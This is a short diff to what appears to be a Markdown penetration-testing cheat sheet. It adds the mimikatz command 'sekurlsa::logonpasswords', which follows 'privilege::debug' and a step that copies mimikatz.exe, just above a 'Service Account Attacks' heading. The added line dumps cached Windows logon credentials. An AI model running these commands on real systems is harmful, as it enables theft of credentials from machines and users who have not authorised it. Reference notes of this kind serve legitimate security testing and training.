@@ -246,6 +246,9 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 ````
 privilege::debug
 ````
+````
+sekurlsa::logonpasswords
+````
 
 
 #### Service Account Attacks <img src="https://cdn-icons-png.flaticon.com/128/720/720234.png" width="40" height="40" />
